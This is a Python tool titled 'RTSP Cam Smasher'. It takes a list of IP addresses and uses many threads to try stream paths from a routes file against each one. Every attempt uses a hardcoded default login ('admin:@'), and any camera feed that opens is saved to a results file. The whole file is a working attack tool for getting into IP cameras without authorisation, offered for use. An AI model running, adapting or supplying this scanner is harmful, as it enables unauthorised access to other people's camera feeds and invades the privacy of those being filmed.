import cv2
import threading
import time
import sys
import datetime

# [ADDED]
import select  # for non-blocking user input


print("---------- RTSP Cam Smasher ----------")
print("---------- By InnerFire ----------")

# ---------------------------
#         LOAD FILES
# ---------------------------
def load_file(filename):
    """Load lines from a file, removing empty lines and stripping whitespace."""
    lines = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line:
                lines.append(line)
    return lines

# ---------------------------
#    HARDCODED USER:PASS
# ---------------------------
USERPASS = "admin:@"

# ---------------------------
#       TEST RTSP
# ---------------------------
def test_rtsp_stream(ip, route):
    """Test an RTSP stream with hardcoded user:pass, return URL on success or None otherwise."""
    rtsp_url = f"rtsp://{USERPASS}{ip}:554{route}"
    print(f"🔍 Testing: {rtsp_url}")

    cap = cv2.VideoCapture(rtsp_url)
    if cap.isOpened():
        print(f"✅ SUCCESS: {rtsp_url}")
        cap.release()
        return rtsp_url
    else:
        print(f"❌ FAILED: {rtsp_url}")
        cap.release()
        return None

# ---------------------------
#  THREAD-SAFE WORK QUEUE
# ---------------------------
class ThreadedList:
    """A thread-safe queue that splits out sublists (batches) for each worker."""
    def __init__(self, items):
        self.items = items
        self.found = []
        self.lock = threading.Lock()

    def getSubList(self, size):
        """Pop up to 'size' items from self.items (thread-safe)."""
        with self.lock:
            if len(self.items) == 0:
                return []
            batch = self.items[:size]
            self.items = self.items[size:]
            return batch

    def addFound(self, url):
        """Store a successful RTSP URL."""
        with self.lock:
            self.found.append(url)

    def getAllFoundAndClear(self):
        """Return all stored successes and clear them."""
        with self.lock:
            res = self.found[:]
            self.found.clear()
            return res

    def hasItems(self):
        """Check if there are items left to process."""
        return len(self.items) > 0

# ---------------------------
#   WORKER THREAD CLASS
# ---------------------------
class RTSPAuthThreader(threading.Thread):
    """Thread that repeatedly grabs a batch of (ip, route) pairs and tests them."""
    def __init__(self, workList, stop_flag, batch_size=50, sleep_time=2):
        threading.Thread.__init__(self)
        self.workList = workList
        self.stop_flag = stop_flag  # shared event to stop testing once success is found
        self.batch_size = batch_size
        self.sleep_time = sleep_time

    def run(self):
        while not self.stop_flag.is_set():
            batch = self.workList.getSubList(self.batch_size)
            if not batch:
                break  # no more routes to test

            # Test each (ip, route) in this batch
            for (ip, route) in batch:
                if self.stop_flag.is_set():
                    break
                result = test_rtsp_stream(ip, route)
                if result:
                    # If success, store it & tell everyone to stop
                    self.workList.addFound(result)
                    self.stop_flag.set()
                    break

            # Sleep a bit between batches
            time.sleep(self.sleep_time)

# ---------------------------
#          MAIN
# ---------------------------
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <ip_list_file>")
        sys.exit(1)

    ip_file = sys.argv[1]
    ips = load_file(ip_file)        # load IPs from user-provided file
    routes = load_file("routes.txt")  # load routes from "routes.txt"

    # Generate output file with timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_filename = f"working_rtsp_{timestamp}.txt"

    results = []
    THREADS = 25        # number of worker threads
    BATCH_SIZE = 50     # how many routes each thread tries per cycle
    SLEEP_TIME = 2      # seconds between cycles

    # For each IP:
    for ip in ips:
        print(f"\n🔄 Switching to IP: {ip}")

        # Build a queue of (ip, route) pairs
        items_for_this_ip = [(ip, route) for route in routes]

        workQueue = ThreadedList(items_for_this_ip)

        # Create a shared stop_flag for the threads of this IP
        stop_flag = threading.Event()

        # Start multiple threads
        threads = [
            RTSPAuthThreader(workQueue, stop_flag, batch_size=BATCH_SIZE, sleep_time=SLEEP_TIME)
            for _ in range(THREADS)
        ]
        for t in threads:
            t.start()

        # [ADDED] -- Allow pressing 'n' to skip the current IP
        # We'll monitor the threads: if they're all done or user hits 'n', we move on.
        while any(t.is_alive() for t in threads):
            # non-blocking check for user input
            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                user_input = sys.stdin.readline().strip().lower()
                if user_input == 'n':
                    print(f"Skipping tests for current IP: {ip}")
                    stop_flag.set()
                    break
            time.sleep(0.1)

        # Wait for threads to finish
        for t in threads:
            t.join()

        # Gather any successful URLs for this IP
        found_for_ip = workQueue.getAllFoundAndClear()
        if found_for_ip:
            results.extend(found_for_ip)
        else:
            print(f"❌ No success for IP {ip}")

    # Save results, if any
    if results:
        with open(output_filename, "w") as f:
            for url in results:
                f.write(url + "\n")
        print(f"\n✅ Working RTSP streams saved to {output_filename}")
    else:
        print("\n❌ No working RTSP streams found.")

if __name__ == "__main__":
    main()
